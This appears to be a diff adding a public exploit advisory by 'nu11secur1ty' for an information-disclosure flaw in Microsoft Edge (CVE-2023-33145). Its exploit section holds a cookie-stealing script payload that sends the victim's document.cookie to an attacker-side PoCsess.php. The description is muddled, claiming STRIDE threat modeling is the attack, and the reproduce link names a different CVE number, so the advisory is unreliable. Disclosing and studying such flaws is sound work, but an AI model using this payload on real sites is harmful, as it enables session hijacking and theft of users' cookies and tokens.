@@ -1,0 +1,52 @@
+## Title:Microsoft Edge 114.0.1823.67 (64-bit) - Information Disclosure
+## Author: nu11secur1ty
+## Date: 07.06.2023
+## Vendor: https://www.microsoft.com/
+## Software: https://www.microsoft.com/en-us/edge?form=MA13FJ&exp=e415
+## Reference: https://portswigger.net/web-security/information-disclosure,
+https://www.softwaresecured.com/stride-threat-modeling/
+## CVE-2023-33145
+
+
+
+## Description:
+The type of information that could be disclosed if an attacker
+successfully exploited this vulnerability is data inside the targeted
+website like IDs, tokens, nonces, cookies, IP, User-Agent, and other
+sensitive information.
+The user would have to click on a specially crafted URL to be
+compromised by the attacker.
+In this example, the attacker use STRIDE Threat Modeling to spoof the
+victim to click on his website and done.
+This will be hard to detect.
+
+## Conclusion:
+Please be careful, for suspicious sites or be careful who sending you
+an link to open!
+
+## Staus: HIGH Vulnerability
+
+[+]Exploit:
+
+- Exploit Server:
+
+```js
+## This is a Get request from the server when the victims click! And
+it is enough to understand this vulnerability! =)
+
+<script> var i = new Image();
+i.src="PoCsess.php?cookie="+escape(document.cookie)</script>
+
+## WARNING: The PoCsess.php will be not uploaded for security reasons!
+## BR nu11secur1ty
+
+```
+
+## Reproduce:
+[href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-33146)
+
+## Proof and Exploit
+[href](https://www.nu11secur1ty.com/2023/07/cve-2023-33145-microsoft-edge.html)
+
+## Time spend:
+01:30:00
